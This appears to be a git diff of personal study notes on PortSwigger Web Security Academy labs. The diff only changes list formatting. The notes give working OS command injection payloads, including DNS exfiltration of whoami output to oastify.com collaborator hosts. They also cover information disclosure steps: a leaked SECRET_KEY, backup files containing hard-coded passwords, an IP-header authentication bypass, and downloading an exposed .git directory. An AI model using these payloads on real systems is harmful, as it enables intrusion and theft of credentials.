@@ -754,17 +754,17 @@
 - Strong input validation (permited values, number, alphanumber, no other syntax or whitespace)
 
 ### Command Injection Lab
-- OS command injection, **simple** case
+1. OS command injection, **simple** case
   - POST /product/stock: productId=1&storeId=1`|whoami`
-- Blind OS command injection with **time delays**
+2. Blind OS command injection with **time delays**
   - POST /feedback/submit:email=`||ping -c 10 127.0.0.1||`
-- Blind OS command injection with **output redirection**
+3. Blind OS command injection with **output redirection**
   - POST /feedback/submit: email=`||whoami>/var/www/images/output.txt||`   
   - https://0a09007904a751a58015128400a000b5.web-security-academy.net/image?filename=`output.txt`   
-- Blind OS command injection with **out-of-band interaction**
+4. Blind OS command injection with **out-of-band interaction**
   - POST /feedback/submit: email=`||nslookup+6jqvweh2htw3iugqlol0e3xquh08o7cw.oastify.com||`
   - Burp Collaborator > Poll now 
-- Blind OS command injection with **out-of-band data exfiltration**
+5. Blind OS command injection with **out-of-band data exfiltration**
   - POST /feedback/submit: email=`||nslookup `whoami`.mpfb2unin92joam6r4rgkj360x6ouoid.oastify.com||`
   - ||nslookup `$(whoami)`.mpfb2unin92joam6r4rgkj360x6ouoid.oastify.com# (URL encode key chr)
   - replace by Burp Collaborator > Poll now
@@ -810,22 +810,22 @@
 - Understand the configuration settings, and security implications, of any third-party technology that you implement
 
 ### Information Disclosure Lab
-- Information disclosure in error messages
+1. Information disclosure in error messages
   - GET /product?**productId=`"example"`**
   - full stack trace leaked: HTTP/2 500 Internal Server Error...**Apache Struts 2 2.3.31**
-- Information disclosure on debug page
+2. Information disclosure on debug page
   - Target Site Map > Right click Engagement Tools > **Find Comments**
   - cgi-bin/phpinfo.php （SECRET_KEY environment variable)   
-- Source code disclosure via backup files
+3. Source code disclosure via backup files
   - Target Site Map > Right click Engagement Tools > **Discover content**
   - Found /backup directory, browse to backup/ProductTemplate.java.bak to access the source code > DB connection contains hard-coded password   
-- Authentication bypass via information disclosure
+4. Authentication bypass via information disclosure
   - GET /admin > HTTP/2 401 Unauthorized
   - `TRACE` /admin > send repeater request > HTTP/2 200 > response X-Custom-IP-Authorization: 116.87.25.165
   - Click **Proxy settings** > Scoll to **"Match and Replace rules"** > click "Add" > **Type: Request Header** > Replace: **X-Custom-IP-Authorization: 127.0.0.1 **  
     Burp Proxy will now add this header to every request you send
   - Now can access Admin page
-- Information disclosure in **version control history**
+5. Information disclosure in **version control history**
   - Manual browse to /.git   
   - Download the git directory: Windows > Cygwin Tool > wget -r https://0afe0009032545248bb6a7c000df0033.web-security-academy.net/.git/   
   - View commit history "Remove admin password from config" `git log`  
